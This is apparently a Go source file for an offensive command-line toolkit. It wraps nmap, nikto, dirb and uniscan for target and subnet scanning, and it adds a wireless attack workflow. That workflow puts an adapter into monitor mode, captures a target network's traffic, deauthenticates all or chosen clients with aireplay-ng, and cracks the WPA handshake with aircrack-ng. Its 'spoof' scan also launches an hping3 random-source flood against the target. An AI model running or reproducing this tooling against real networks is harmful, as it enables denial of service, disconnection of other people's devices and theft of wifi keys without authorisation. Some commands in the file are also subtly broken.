package main

import (
	"fmt"
	"os/exec"
	"os"
	"strings"
	"context"
    "sync"
	"net"
	"bufio"
	"bytes"
	"path/filepath"
	"strconv"
	"net/url"
	"time"
	"unicode"
)

// COLORS
const (
	Red   = "\033[31m"
	Green = "\033[32m"
	Reset = "\033[0m"
	Yellow = "\033[33m"
)

func main() {

	if len(os.Args) != 2 {
		fmt.Println("Usage: cypher [options]")
		return
	}
	permission := CheckIfroot()
	if permission == false {
		fmt.Print("You are not root. Some scans are " + Red + "unavailable \n" + Reset)
	}
	switch os.Args[1] {
	case "-h", "--help":
		help()
	case "-v":
		if permission == true {
			vamp()	
		} else {
			return
		}
	case "--file", "-f" :
		if permission == true {
			ScanFile()
		} else {
			return
		}
	case "-nS", "--net-scan":
			netScan()
	case "-m":
		if permission == true {
			MonitorMode()
		} else {
			return
		}
	default:
		fmt.Println("Invalid option. Use '-h' or '--help' for usage instructions.")
	}
}

//Manual
func help() {
	fmt.Println("Help \n")
	fmt.Println("Command line >> ")
	fmt.Println("Command 				Usage")
	fmt.Println()
	fmt.Println("	-h 	 --help			      Shows the command line")
	fmt.Println("	-f  	   --file			   Runs Vamp with your own file file with targets")
	fmt.Println("	-v						Starts cypher scanner for specific URL/IP")
	fmt.Println("	-nS	--net-scan		Scans the local network for Targets")
	fmt.Println("	-m					      Network Monitor")
	fmt.Println("\n")
	fmt.Println(" ! WARNING : High number of IPs for concurrent scans using the --file argument may affect your system performance")
    fmt.Println("             Using the spoofing option for target scans might cause a dos attack depending on the specific network")
}

func CheckIfroot() bool {
	  // Get the effective user ID of the current process
	  euid := os.Geteuid()
	// Check if the effective user ID is 0 (root)
	if euid == 0 {
		fmt.Println("The program is running as " + Green + "root" + Reset + ".")
		return true
	} else {
		fmt.Println("The program is not running as root.")
		return false
	}
}

// Vamp //
func vamp() {

	fmt.Printf(Icon())

	// Define the directory path to save the output files
	outputDir := "SCAN_RESULTS/"

	// Create the directory if it doesn't exist
	if _, err := os.Stat(outputDir); os.IsNotExist(err) {
		os.Mkdir(outputDir, 0755)
	}

	// Input
	var ips string
	fmt.Println(Red + "Who we checkin lil bro ?" + Reset)
	fmt.Fprintln(os.Stderr, Red+"Enter multiple IP addresses separated by spaces:"+Reset)
	fmt.Print("IP addresses " + Red + ">> " + Reset)
	// Read input from standard input
	reader := bufio.NewReader(os.Stdin)
	ips, _ = reader.ReadString('\n')

	ipList := strings.Fields(ips)

	// Print the list of IP addresses received
	fmt.Println("IP addresses received:", ipList)

	// Loop through each IP address and process them one by one
	for _, ip := range ipList {
		if isValidIP(ip) {
			processIP(ip, outputDir)
		} else {
			fmt.Printf("Invalid IP: %s\n", ip)
		}
	}

	fmt.Println("All scans completed.")
}

//validating ip
func isValidIP(ip string) bool {
	return net.ParseIP(ip) != nil
}
//running all scanners 
func processIP(ip, outputDir string) {
	fmt.Printf("Target set to " + Red + ">> %s\n", Green+ip+Reset)
	if isHostAlive(ip) {
		runNmap(ip, outputDir)
		runNikto(ip, outputDir)
		getSpecificURL(ip, outputDir)
	} else {
		fmt.Printf("%s is 6 feet under :(.\n", Green+ip+Reset)
	}
}
//checking if host is alive
func isHostAlive(ip string) bool {
	fmt.Println("Checking if target is reachable")
	check := exec.Command("ping", "-c", "5", ip)
	if err := check.Run(); err != nil {
		return false
	}
	fmt.Println(Green + "Target " + ip + " is alive... for now. ;)" + Reset)
	return true
}

//nmap options menu
func runNmap(ip, outputDir string) {
    // Define the accepted options
    accept := map[string]bool{
        "a": true,
        "A": true,
        "q": true,
        "Q": true,
        "s": true,
        "S": true,
    }

    // Prompt the user for input until a valid option is provided
    var scan string
    for {
        fmt.Print("(A)ggresive, (S)poofer, (Q)uick scan " + Red + ">> " + Reset)
        fmt.Scanln(&scan)

        // Check if the input is valid
        if _, ok := accept[scan]; ok {
            break // Exit the loop if the input is valid
        }

        fmt.Println("Invalid option, please choose again.")
    }

    // Create channels for synchronization
    done := make(chan bool, 2)

    // Close the done channel when the function returns
    defer close(done)

    // Run nmap based on the selected scan type
    switch scan {
    case "a", "A":
        runNmapAggressive(ip, outputDir, done)
    case "s", "S":
        runNmapSpoof(ip, outputDir)
    case "q", "Q":
        runNmapQuick(ip,  outputDir)
    default:
        fmt.Println("Invalid scan type")
    }
}
//Nmap options //
func runNmapAggressive(ip, outputDir string, done chan<- bool) {
    fmt.Print("Ports (max port, empty for default): ")
    var ports string
    fmt.Scanln(&ports)
    if len(ports) == 0 {
        ports = "10000"
    } else {
        // Validate if the input is a number
        if _, err := strconv.Atoi(ports); err != nil {
            fmt.Println(Red + "Invalid input. Port must be a number." + Reset)
            done <- false // Signal that the nmap scan is done with an error
            return
        }
    }
    fmt.Printf("Using nmap "+Green+"Aggressive Scan"+Reset+" for IP first %s ports"+Red+">> "+Reset+"%s\n", Green+ports+Reset, Red+ip+Reset)
    cmd := exec.Command("nmap", "-Pn", "-A", "-sC", "-p1-"+ports, "--open", "--stats-every", "30s", "-oA", outputDir+"AggresiveScan_"+ip, ip)
    fmt.Println(Red + "------------------------------------------------------------")
    cmd.Stdout = os.Stdout
    fmt.Println("------------------------------------------------------------" + Reset)

    if err := cmd.Run(); err != nil {
        fmt.Println(Red + "could not run nmap command:", err, Reset)
    }
    fmt.Println(Red + " =============================================================" + Reset)

    // Signal that the nmap scan is done
    done <- true
}

func runNmapSpoof(ip, outputDir string) {
    fmt.Printf("Using nmap with " + Green + "Spoofed Mac for IP " + Red + ">> " + Reset + "%s\n", Red+ip+Reset)

    // Create a channel to communicate when nmap completes
    nmapDone := make(chan bool)
    // Run nmap command
    go func() {
        defer close(nmapDone) // Signal that nmap is done when the function returns
        cmd := exec.Command("nmap", "-Pn", "-sS", "-O", "-p1-1000", "--open", "--reason", "--stats-every", "30s", "-oA", outputDir+"nmap_output_"+ip, "-f", "--spoof-mac", "00:00:00:00:00:00", "--script", "vuln", ip)
        fmt.Println(Red + "------------------------------------------------------------")
        cmd.Stdout = os.Stdout
        fmt.Println("------------------------------------------------------------" + Reset)

        if err := cmd.Run(); err != nil {
            fmt.Println(Red+"could not run nmap command:", err, Reset)
        }
        fmt.Println(Red + " =============================================================" + Reset)
    }()

    // Run hping3 command concurrently with nmap
    hpingCmd := exec.Command("hping3", "--flood", "--rand-source", ip)
    hpingCmd.Stdout = os.Stdout

    if err := hpingCmd.Start(); err != nil {
        fmt.Println(Red+"could not start hping3 command:", err, Reset)
        return
    }

    // Wait for nmap to complete
    <-nmapDone

    // Stop hping3 command
    fmt.Println("Stopping hping3")
    if err := hpingCmd.Process.Kill(); err != nil {
        fmt.Println(Red+"could not stop hping3:", err, Reset)
    } else {
        fmt.Println(Green + "hping3 command stopped" + Reset)
    }
}

func runNmapQuick(ip , outputDir string) {
    fmt.Printf("Using nmap " + Green + "Quick Scan" + Reset + " for IP  " + Red + ">> " + Reset + "%s\n", Red+ip+Reset)
    cmd := exec.Command("nmap","-T5", "--open", "-Pn", "-p0-", ip)

    // Run the first Nmap scan
    output, err := cmd.CombinedOutput()
    if err != nil {
        fmt.Println(Red+"could not run nmap command:", err, Reset)
        return
    }

    // Parse the output of the first scan to extract open ports
    openPorts := extractOpenPorts(output)

    // Perform a second Nmap scan only on the open ports
    if len(openPorts) > 0 {
        fmt.Println(Green + "Performing second scan on open ports: "+ Reset +openPorts)
        cmd = exec.Command("nmap", "-sC", "-A", "--script", "vuln", "-p"+openPorts,"-oA", outputDir+"QuickScan_"+ip, ip)
        cmd.Stdout = os.Stdout
        cmd.Stderr = os.Stderr

        if err := cmd.Run(); err != nil {
            fmt.Println(Red+"could not run nmap command:", err, Reset)
            return
        }
    } else {
        fmt.Println(Green + "No open ports found, skipping second scan." + Reset)
    }

    fmt.Println(Red + " =============================================================" + Reset)
}

// Function to extract open ports from Nmap scan output for quickscan
func extractOpenPorts(output []byte) string {
    openPorts := ""

    // Convert the byte slice to a string
    outputStr := string(output)

    // Split the output into lines
    lines := strings.Split(outputStr, "\n")

    // Flag to indicate if we've encountered the header line
    headerFound := false

    // Iterate over each line
    for _, line := range lines {
        // Check if the line contains the header indicating port information
        if strings.HasPrefix(line, "PORT") {
            headerFound = true
            continue
        }

        // Skip empty lines and lines that don't contain port information
        if line == "" || !headerFound {
            continue
        }

        // Extract port number from the line
        fields := strings.Fields(line)
        if len(fields) > 0 {
            port := fields[0]

            // Extract only the digits from the port string
            portNumber := ""
            for _, char := range port {
                if unicode.IsDigit(char) {
                    portNumber += string(char)
                }
            }

            // Append the port number to the openPorts string
            if portNumber != "" {
                openPorts += portNumber + ","
            }
        }
    }

    // Remove trailing comma, if any
    if len(openPorts) > 0 {
        openPorts = openPorts[:len(openPorts)-1]
    }

    return openPorts
}
// End of nmap options //

// URL Scaanner //
func runNikto(ip, outputDir string) {
    fmt.Printf("Using Nikto for IP " + Red + ">> " + Reset + "%s\n", Green+ip+Reset)
    // Specify the output directory path along with the filename
    outputFilePath := outputDir + "nikto_output_" + ip + ".txt"
    outputFile, err := os.Create(outputFilePath)
    if err != nil {
        fmt.Println(Red + "Could not create output file:", err.Error(), Reset)
        return
    }
    defer outputFile.Close()

    niktoCmd := exec.Command("nikto", "-h", ip, "-ssl", "-Format", "txt", "-maxtime", "300", "-Tuning", "123bde", "-output", outputFilePath)
    niktoCmd.Stdout = outputFile
    if err := niktoCmd.Run(); err != nil {
        fmt.Println(Red + "Could not run Nikto command:", err.Error(), Reset)
        return
    }
    fmt.Println(Red + "==============================================" + Reset)
}

// Function to sanitize URL for use as a filename
func sanitizeURL(url string) string {
	// Replace problematic characters with underscores
	sanitized := strings.ReplaceAll(url, "://", "_")
	sanitized = strings.ReplaceAll(sanitized, ":", "_")
	sanitized = strings.ReplaceAll(sanitized, "/", "_")
	return sanitized
}

// Function to extract IP address from URL
func extractIPAddress(rawurl string) (string, error) {
	u, err := url.Parse(rawurl)
	if err != nil {
		return "", err
	}
	host := u.Hostname()
	if host == "" {
		return "", fmt.Errorf("invalid URL: missing hostname")
	}
	return host, nil
}

// Function to scan a specific URL for vulnerabilities
func getSpecificURL(ip, outputDir string) {
	for {
		var site string
		fmt.Printf("Enter the URL for IP %s%s%s or press Enter to scan the next IP: ", Green, ip, Reset)
		fmt.Scanln(&site)
		if len(site) == 0 {
			fmt.Println(Green + "Scanning the next IP..." + Reset)
			break
		}

		// Create a context to potentially cancel command execution
		ctx, cancel := context.WithCancel(context.Background())

		// Sanitize the URL to make it suitable for use as a filename
		sanitizedURL := sanitizeURL(site)

		// Extract IP address from URL
		targetIP, err := extractIPAddress(site)
		if err != nil {
			fmt.Println(Red+"Error extracting IP address:", err, Reset)
			cancel()
			continue
		}

		// Create output channels for each command
		dirbOutput := make(chan string)
		uniscanOutput := make(chan string)
		nmapOutput := make(chan string)

		// Start goroutine to print animated loading dots
		loadingDone := make(chan struct{})
		go func() {
			defer close(loadingDone)
			for {
				select {
				case <-loadingDone:
					return
				default:
					fmt.Printf("\r%s%s", Yellow+"Program still running..."+dots()+" "+Reset, Green)
					time.Sleep(500 * time.Millisecond)
				}
			}
		}()

		// Execute Dirb command
		go func() {
			defer close(dirbOutput)
			dirbCmd := exec.CommandContext(ctx, "dirb", site, "-r", "-S", "-N", "404", "-o", outputDir+"dirb_output_"+sanitizedURL+".txt")
			output, err := dirbCmd.CombinedOutput()
			if err != nil {
				dirbOutput <- fmt.Sprintf("Error executing dirb command: %v", err)
				return
			}
			dirbOutput <- string(output)
		}()

		// Execute Uniscan command
		go func() {
			defer close(uniscanOutput)
			uniscanCmd := exec.CommandContext(ctx, "uniscan", "-u", site, "-qwe", "-o", outputDir+"uniscan_output_"+sanitizedURL+".txt")
			output, err := uniscanCmd.CombinedOutput()
			if err != nil {
				uniscanOutput <- fmt.Sprintf("Error executing uniscan command: %v", err)
				return
			}
			uniscanOutput <- string(output)
		}()

		// Execute Nmap command
		go func() {
			defer close(nmapOutput)
			nmapCmd := exec.CommandContext(ctx, "nmap", "-p443", "--script", "http-waf-detect", "--script-args", "http-waf-detect.aggro,http-waf-detect.detectBodyChanges", targetIP)
			output, err := nmapCmd.CombinedOutput()
			if err != nil {
				nmapOutput <- fmt.Sprintf("Error executing nmap command: %v", err)
				return
			}
			nmapOutput <- string(output)
		}()

		// Print output from each command sequentially
		for {
			select {
			case output, ok := <-dirbOutput:
				if !ok {
					dirbOutput = nil
					continue
				}
				fmt.Printf("\r%s\n", output) // Print output without interrupting the loading message
			case output, ok := <-uniscanOutput:
				if !ok {
					uniscanOutput = nil
					continue
				}
				fmt.Printf("\r%s\n", output) // Print output without interrupting the loading message
			case output, ok := <-nmapOutput:
				if !ok {
					nmapOutput = nil
					continue
				}
				fmt.Printf("\r%s\n", output) // Print output without interrupting the loading message
			case <-ctx.Done():
				// Cancel ongoing commands if the context is cancelled
				cancel()
				<-dirbOutput // Drain the channel to avoid goroutine leak
				<-uniscanOutput
				<-nmapOutput
				close(loadingDone) // Stop the loading animation
				return
			}
		}
	}
}

// Function to generate animated loading dots
func dots() string {
	dots := []string{"", ".", "..", "..."}
	return dots[int(time.Now().UnixNano()/500000000)%4]
}
// End of URL Scanners //

// Scan ips from file concurently
func ScanFile() {
    fmt.Print("File with targets " + Red + ">> " + Reset)
    var fileToScan string
    fmt.Scanln(&fileToScan)
    // Read IP list from file
    ipList, err := readIPListFromFile(fileToScan)
    if err != nil {
        fmt.Printf("Error reading IP list: %v\n", err)
        return
    }

    // Define the directory path to save the output files
    outputDir := "FileScanned/"

    // Create the directory if it doesn't exist
    if _, err := os.Stat(outputDir); os.IsNotExist(err) {
        os.Mkdir(outputDir, 0755)
    }

    var wg sync.WaitGroup
    var mu sync.Mutex // Mutex for protecting buffer
    var outputBuffer bytes.Buffer // Buffer to collect output
    done := make(chan struct{}, len(ipList)) // Buffered channel

    for _, ip := range ipList {
        if isValidIP(ip) {
            wg.Add(1)
            go func(ip string) {
                defer wg.Done()
                scanOutput := MassiveScan(ip, outputDir)
                mu.Lock()
                defer mu.Unlock()
                outputBuffer.WriteString(scanOutput)
                done <- struct{}{}
            }(ip)
        } else {
            fmt.Printf("Invalid IP: %s\n", ip)
        }
    }

    go func() {
        wg.Wait()
        close(done) // Close done channel when all goroutines are done
    }()

    // Wait for all scans to finish
    for range ipList {
        <-done
    }

    // Print the output at the end
    fmt.Println(outputBuffer.String())

	// Combine the XML files into one
	combinedXMLFile := outputDir + "combined.xml"
	fmt.Println("Combining XML files into:", combinedXMLFile)

	// Check the list of XML files in the directory
	xmlFiles, err := filepath.Glob(outputDir + "*.xml")
	if err != nil {
		fmt.Println("Error finding XML files:", err)
		return
	}
	fmt.Println("Found XML files:", xmlFiles)

	// Create the combined XML file
	xmlFile, err := os.Create(combinedXMLFile)
	if err != nil {
		fmt.Println("Error creating combined XML file:", err)
		return
	}
	defer xmlFile.Close()

	// Concatenate the XML files
	cmd := exec.Command("cat", xmlFiles...)
	cmd.Stdout = xmlFile
	if err := cmd.Run(); err != nil {
		fmt.Println("Error combining XML files:", err)
		return
	}

	fmt.Println("Combined XML file created successfully:", combinedXMLFile)
}


func readIPListFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err // Return error if file cannot be opened
	}
	defer file.Close()

	var ipList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ip := scanner.Text()
		ipList = append(ipList, ip)
	}
	if err := scanner.Err(); err != nil {
		return nil, err // Return error if there's an error during scanning
	}

	return ipList, nil
}

func MassiveScan(ip, outputDir string) string {
    var output bytes.Buffer // Buffer to collect output
    fmt.Printf("Starting " + Green + "Scan" + Reset + " for IP " + Red + ">> " + Reset + "%s\n", Red+ip+Reset)
    outputFile := outputDir + ip + ".txt"
    cmd := exec.Command("nmap", "-T5", "-A", "--open", "-oA", outputFile, ip)
    fmt.Println(Green + "scanning " + Reset + " ..." + Red)
    cmd.Stdout = &output // Redirect command output to buffer
    fmt.Println("------------------------------------------------------------" + Reset)

    if err := cmd.Run(); err != nil {
        fmt.Println(Red+"could not run nmap command:", err, Reset)
    }
    fmt.Println(Red + " =============================================================" + Reset)

    return output.String() // Return output as string
}
// End of File scan //

// Subnet Scanner //
func netScan() {
    var subnet string
    fmt.Print("Enter the subnet address (e.g., 192.168.1.0/24, empty for default): ")
    fmt.Scanln(&subnet)
    if subnet == "" {
        subnet = "192.168.1.0/24"
    }
	fmt.Print("Do you want to scan only common ports ? ")
	var choice string
	fmt.Scanln(&choice)
	for choice != "y" && choice != "n" {
        fmt.Println("Please type y/n")
        fmt.Print("Do you want to scan only common ports? (y/n): ")
        fmt.Scanln(&choice)
    }
	
	var cmd *exec.Cmd
	if choice == "y" {
		cmd = exec.Command("nmap", "-p80,443,445,21,22,23,25,110,143,8080", "-oG", "-", "-T4", subnet)
	} 
	if choice == "n" {
		cmd = exec.Command("nmap", "-sS", "-oG", "-", "-T4", subnet)
	}
	
    fmt.Println(Green + "Scanning " + Reset + subnet + Red + " >>" + Reset)

    // Execute the command
    output, err := cmd.CombinedOutput()
    if err != nil {
        fmt.Println("Error:", err)
        return
    }

    // Parse the output to extract alive hosts with open ports
    scannedHosts := parseNmapOutput(string(output))

    // Check if no hosts were found
    if len(scannedHosts) == 0 {
        fmt.Println("No hosts found.")
    } else {
		// Print the scanned hosts with open ports
    	for host, ports := range scannedHosts {
        	fmt.Printf("Scanned host: " + Red + "%s" + Reset + ", Open Ports: " + Green + "%v\n" + Reset, host, ports)
    	}
	}
	fmt.Println()
	fmt.Println("_______________________________________________________________________________________________\n")
	fmt.Print("Do you want to perform an arp scan ? (y/n): ")
	fmt.Scanln(&choice)
	for choice != "y" && choice != "n" {
        fmt.Println("Please type y/n")
        fmt.Print("Do you want to perform an arp scan ? (y/n): ")
        fmt.Scanln(&choice)
    }
	if choice == "y" {
		cmd = exec.Command("arp-scan", subnet)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err := cmd.Run()
   		if err != nil {
        fmt.Println("Error:", err)
        return
    }

	}
	fmt.Println()
	fmt.Println("_______________________________________________________________________________________________\n")
	
	
}
	
// ParseNmapOutput parses the Nmap output and extracts alive hosts with open ports
func parseNmapOutput(output string) map[string][]string {
    scannedHosts := make(map[string][]string)

    lines := strings.Split(output, "\n")
    var currentHost string
    for _, line := range lines {
        // Check if the line indicates an alive host with open ports
        if strings.Contains(line, "Host:") && strings.Contains(line, "Status: Up") {
            // Extract the IP address from the line
            fields := strings.Fields(line)
            if len(fields) >= 2 {
                currentHost = fields[1]
            }
        } else if strings.Contains(line, "/open/") {
            // Extract port information from the line
            fields := strings.Fields(line)
            for _, field := range fields {
                // Check if the field contains an open port
                if strings.Contains(field, "/open/") {
                    // Extract the port number
                    port := strings.Split(field, "/")[0]
                    scannedHosts[currentHost] = append(scannedHosts[currentHost], port)
                }
            }
        }
    }

    return scannedHosts
}
// End of Subnet scanner //

// Network Monitoring //



func launchTerminal(cmdArgs...string) error {
	// Join the command arguments
	command := strings.Join(cmdArgs, " ")
	// Construct the command to open x-terminal-emulator with airdump-ng
	cmd := exec.Command("nohup", "x-terminal-emulator", "-e", "bash", "-c", command + "; read -p 'Press Enter to exit'")
	err := cmd.Start()
	if err!= nil {
		fmt.Println("Error starting command:", err)
		return err
	}
	// No need to wait for the command to finish here since it's detached
	return nil
}

func startMonitorMode(adapter string) string {
	
	// Kill processes that might interfere with the wireless interface
	// cmdKill := exec.Command("airmon-ng", "check", "kill")
	// cmdKill.Stdout = os.Stdout
	// cmdKill.Stderr = os.Stderr
	// err := cmdKill.Run()
	// if err!= nil {
	// 	fmt.Println("Error killing processes:", err)
	// 	return err
	// }

	// Start the wireless interface in monitor mode
	fmt.Println("Starting Monitor mode.")
	cmd := exec.Command("airmon-ng", "start", adapter)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err!= nil {
		fmt.Println(Red + "Error " + Reset + "starting monitor mode:", err)
		return "operation failed"
	}

	fmt.Println("Monitor mode started " + Green + "successfully" + Reset + ".")
	adapter = findNewAdapter(adapter)
	if err!= nil {
		fmt.Println(Red + "Error " + Reset + "starting monitor mode:", err)
		return "operation failed"
	}

	return adapter
}

func findNewAdapter(adapter string) string {
    cmdIWConfig := exec.Command("iwconfig")
    cmdAWK := exec.Command("awk", "/^"+adapter+"/ {print $1}")

    // Set up a pipe to connect the stdout of cmdIWConfig to the stdin of cmdAWK
    cmdAWK.Stdin, _ = cmdIWConfig.StdoutPipe()

    // Set up output capturing for cmdAWK
    var awkOutput bytes.Buffer
    cmdAWK.Stdout = &awkOutput

    // Start cmdAWK first to avoid a deadlock
    if err := cmdAWK.Start(); err!= nil {
        fmt.Println(Red + "Error " + Reset + "starting awk command:", err)
        return ""
    }

    // Run cmdIWConfig
    if err := cmdIWConfig.Run(); err!= nil {
        fmt.Println(Red + "Error " + Reset + "running iwconfig command:", err)
        return ""
    }

    // Wait for cmdAWK to finish
    if err := cmdAWK.Wait(); err!= nil {
        fmt.Println(Red + "Error " + Reset + "waiting for awk command:", err)
        return ""
    }

    // Process the output of awk to get the found adapter
    foundAdapter := awkOutput.String() // Correctly get the string output

    // Use strings.TrimSpace to remove leading and trailing whitespace
    foundAdapter = strings.TrimSpace(foundAdapter)

    return foundAdapter
}

func captureTraffic(newadapter string) error {
    fmt.Println("Opening new terminal window and capturing wireless traffic.")
    // Adjusted to include a continuous monitoring argument
    return launchTerminal("airodump-ng", newadapter)
}


func scanTarget(BSSID, channel, newadapter string) error {
	fmt.Printf("Opening new terminal for target %s\n", Green + BSSID + Reset)
	return launchTerminal("airodump-ng --bssid " + BSSID + " -c" + channel + " --write captureWpa " + newadapter)
}

func deauthenticateAllTargets(BSSID, newadapter string) error {
    fmt.Println("Turning target offline...")
    return launchTerminal("aireplay-ng --deauth 0 -a " + BSSID + " " + newadapter)
}

func deauthenticateTarget(BSSID , Station, newadapter string) error {
	fmt.Println("Turning target offline...")
	return launchTerminal("aireplay-ng --deauth 0 -a "+BSSID+" -c " + Station + newadapter)
}

func crackWPA(wordlist, file string) error {
	fmt.Printf("Cracking WPA KEY")
	return launchTerminal("aircrack-ng -w "+wordlist+" "+file)
}

func ReturnAdapterState(newadapter string) {
	fmt.Print("Changing adapter back to Mode: Managed")
	cmd := exec.Command("airmon-ng", "stop", newadapter)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err!= nil {
		fmt.Println(Red + "Error " + Reset + "reseting adapter : ", newadapter)
		return
	} else {
		fmt.Println("Adapter reset was " + Green + "succesful" + Reset)
	}
}

func MonitorMode() {
	// Enabling monitor mode
	cmd := exec.Command("iwconfig")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err!= nil {
		fmt.Println(Red + "Error " + Reset + "showing wifi adapters", err)
		return
	}
	fmt.Println()
	fmt.Print("Specify Wireless adapter <<wlan0>>: ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	adapter := scanner.Text()

	if adapter == "" {
		adapter = "wlan0" // Default to wlan0 if no adapter is specified
	}

	//making sure adapter is wireless
	if !strings.HasPrefix(adapter, "wlan") {
		fmt.Println("Monitor mode is only applicable to wireless adapters. Please specify a wireless adapter.")
		return
	}

	newadapter := startMonitorMode(adapter)
	if newadapter == "operation failed" {
		return
	}
	fmt.Println("Using : " + newadapter)
	// Scanning Wireless Traffic
	err = captureTraffic(newadapter)
	if err != nil {
		fmt.Println(Red + "Failed " + Reset + "to capture wireless traffic with error :", err)
		return
	}
	
	// Focusing on Target
	var BSSID, channel, Station, wordlistfile, WpaHandshakeFile string

	fmt.Print("Target BSSID: ")
	scanner.Scan()
	BSSID = scanner.Text()

	fmt.Printf("Channel for %s: ", BSSID)
	scanner.Scan()
	channel = scanner.Text()

	err = scanTarget(BSSID, channel, newadapter)
	if err != nil {
		fmt.Println(Red + "Failed " + Reset + "to scan target:", BSSID)
		fmt.Println("Error : ", err)
		return
	}

	// choosing client in target network to deauth
	fmt.Print("Choose client on network to deauthenticate(press enter for all connected clients) \n")
	fmt.Print("Station : ")
	scanner.Scan()
	Station = scanner.Text()
	if Station == "" {
		err = deauthenticateAllTargets(BSSID, newadapter)
		if err != nil {
		fmt.Println(Red + "Failed " + Reset + "to deauthenticate clients on :", BSSID)
		fmt.Println("Error : ", err)
		return
		}
	} else { 
		err = deauthenticateTarget(BSSID, Station, newadapter)
		if err != nil {
			fmt.Println(Red + "Failed " + Reset + "to deauthenticate target:", Station)
			fmt.Println("Error : ", err)
			return
		} 
	}

	//returning adapter state to managed mode
	ReturnAdapterState(newadapter)
	
	// wordlist file input
	fmt.Print("Wordlist file : ")
	scanner.Scan()
	wordlistfile = scanner.Text()
	for {
		if _, err := os.Stat(wordlistfile); os.IsNotExist(err) {
			fmt.Print(Red + "Error" + Reset + " File do not exist .")
			fmt.Print("Specify file with WPA handshake (file.cap): ")
			scanner.Scan()
			wordlistfile = scanner.Text()
		} else {
			break
		}
	}
	fmt.Println("File exists:", wordlistfile)

	// capture handshake file input
	fmt.Print("Captured Files : ")
	cmd = exec.Command("ls","|","grep","*.cap")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err!= nil {
		fmt.Println(Red + "Error " + Reset + "showing captured files", err)
		return
	}
	fmt.Println()
	fmt.Print("Specify file with WPA handshake (file.cap): ")
	scanner.Scan()
	WpaHandshakeFile = scanner.Text()
	// validating file exists
	for {
		if _, err := os.Stat(WpaHandshakeFile); os.IsNotExist(err) {
			fmt.Print(Red + "Error" + Reset + " File do not exist .")
			fmt.Print("Specify file with WPA handshake (file.cap): ")
			scanner.Scan()
			WpaHandshakeFile = scanner.Text()
		} else {
			break
		}
	}
	fmt.Println("File exists:", WpaHandshakeFile)
	//pass files to crackWPA func
	err = crackWPA(wordlistfile,WpaHandshakeFile)
	if err != nil {
		fmt.Println("Failed to crack WPA key:", err)
		return
	}
}

/// Style
func Icon() string {
    art := `
             ,     ,
             (\____/)
             / @__@ \
            (  (oo)  )
             ` + "`" + `-.~~.-'
              /    \
            @/      \
           /        \
           |        |_    __
           |  @ |   \@  / /       Can't hide forever
           \   |       \/ /
            \  |     \   /
             \ |-----|
              ^^   /^\
            /^\/ ^ ^ ^ \
            / ^   ^  ^   ^\
            /  ^ ^ ^   ^    \
            / ^ ^  ^   ^  ^  ^ \
            /____________________ \
            / ^  ^  ^  ^  ^  ^  ^  ^ \
             ^                          ^
  `
    return art
}
